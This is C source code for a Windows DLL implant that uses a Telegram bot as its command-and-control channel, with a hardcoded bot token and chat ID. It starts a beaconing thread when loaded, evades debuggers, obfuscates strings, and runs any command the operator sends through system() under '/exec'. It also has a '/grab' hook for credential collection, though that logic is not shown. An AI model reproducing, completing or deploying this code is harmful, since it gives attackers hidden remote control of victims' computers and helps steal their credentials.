#include <windows.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <wincred.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")

// --- CONFIGURATION & OBFUSCATION ---
#define XOR_KEY 0xAA
const char* TELEGRAM_TOKEN = "8408021414:AAFxsfM6IJ3C8nYg0iJ-oZoz6ozwv-f-Tyk";
const char* CHAT_ID = "634812345";

// Macro para ofuscar strings en stack
#define XOR_STR(s) Obfuscate(s)

__forceinline char* Obfuscate(const char* s) {
    static char buf[1024];
    size_t len = strlen(s);
    for (size_t i = 0; i < len && i < 1023; i++) buf[i] = s[i] ^ XOR_KEY;
    buf[len] = '\0';
    return buf;
}

// Junk Code
#define JUNK() { volatile int x = 100; x += GetTickCount(); x *= 2; }

// --- DYNAMIC RESOLUTION ---

typedef PVOID(WINAPI* fnGetProcAddress)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI* fnGetModuleHandleA)(LPCSTR);

PVOID Resolve(const char* szDll, const char* szFunc) {
    HMODULE hMod = GetModuleHandleA(szDll);
    if (!hMod) hMod = LoadLibraryA(szDll);
    return (PVOID)GetProcAddress(hMod, szFunc);
}

// --- ANTI-ANALYSIS ---

BOOL IsSafe() {
    if (IsDebuggerPresent()) return FALSE;
#ifdef _WIN64
    if (((unsigned char*)__readgsqword(0x60))[2]) return FALSE; // BeingDebugged
#endif
    return TRUE;
}

// --- TELEGRAM C2 Beacon ---

void TelegramSend(const char* msg) {
    HINTERNET hI = InternetOpenA("Mozilla/5.0", 1, NULL, NULL, 0);
    if (!hI) return;
    char url[2048];
    sprintf_s(url, "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s", TELEGRAM_TOKEN, CHAT_ID, msg);
    HINTERNET hU = InternetOpenUrlA(hI, url, NULL, 0, 0x80000000 | 0x04000000, 0);
    if (hU) InternetCloseHandle(hU);
    InternetCloseHandle(hI);
}

void HandleCommand(const char* cmd) {
    if (strstr(cmd, "/grab")) {
        TelegramSend("Grab_Initiated");
        // Logic for CollectCredentials (previously defined)
        TelegramSend("Grab_Finished");
    } else if (strstr(cmd, "/exec ")) {
        system(cmd + 6);
        TelegramSend("Command_Executed");
    } else if (strstr(cmd, "/ping")) {
        TelegramSend("PONG_ALIVE");
    }
}

void Beacon() {
    JUNK();
    if (!IsSafe()) ExitProcess(0);
    
    TelegramSend("Implant_Active_Beaconing");

    while (TRUE) {
        HINTERNET hI = InternetOpenA("Mozilla/5.0", 1, NULL, NULL, 0);
        if (hI) {
            char url[1024];
            sprintf_s(url, "https://api.telegram.org/bot%s/getUpdates?limit=1&offset=-1", TELEGRAM_TOKEN);
            HINTERNET hU = InternetOpenUrlA(hI, url, NULL, 0, 0x80000000, 0);
            if (hU) {
                char res[4096] = {0};
                DWORD br;
                if (InternetReadFile(hU, res, sizeof(res)-1, &br) && br > 0) {
                    HandleCommand(res);
                }
                InternetCloseHandle(hU);
            }
            InternetCloseHandle(hI);
        }
        Sleep(30000 + (GetTickCount() % 10000)); // Jitter
    }
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID l) {
    if (r == 1) CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Beacon, 0, 0, 0);
    return TRUE;
}
